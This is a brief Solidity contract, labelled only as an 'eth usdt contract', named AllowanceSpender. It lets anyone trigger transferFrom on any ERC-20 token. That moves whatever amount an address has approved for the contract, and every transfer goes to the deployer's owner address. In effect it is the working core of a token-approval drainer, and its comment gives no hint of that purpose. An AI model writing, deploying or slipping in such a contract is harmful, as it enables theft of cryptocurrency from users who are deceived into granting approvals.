// SPDX-License-Identifier: MIT
// nice dgrd
//eth usdt contract 
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
}

contract AllowanceSpender {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    event Spent(address token, address from, uint amount);

    function spendAllowance(address tokenAddress, address from, uint amount) external {
        IERC20 token = IERC20(tokenAddress);

        uint allowed = token.allowance(from, address(this));
        require(allowed >= amount, "Not enough allowance");

        (bool success, bytes memory data) = tokenAddress.call(
    abi.encodeWithSelector(IERC20.transferFrom.selector, from, owner, amount)
);
require(success, "Low-level transferFrom failed");

// If the token returns data, check it == true
if (data.length > 0) {
    require(abi.decode(data, (bool)), "ERC20 transferFrom returned false");
}

        emit Spent(tokenAddress, from, amount);
    }
}

